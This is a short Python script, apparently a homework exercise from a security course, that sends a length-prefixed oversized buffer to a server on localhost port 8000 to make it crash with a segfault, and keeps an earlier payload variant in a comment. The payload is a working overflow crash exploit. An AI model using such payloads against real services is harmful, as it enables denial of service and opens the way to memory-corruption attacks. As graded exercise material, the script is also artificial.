#!/usr/bin/python

import os, socket


HOST = '127.0.0.1'
PORT = 8000


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This data should cause the server to crash (and generate a segfault).
    '''

   # length = "\x00\x00\x04\x1a"

    #return  length + "0"*1050

    length = "\x00\x00\x04\x14"

    return  length + "0"*1042 + "1" * 2

    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
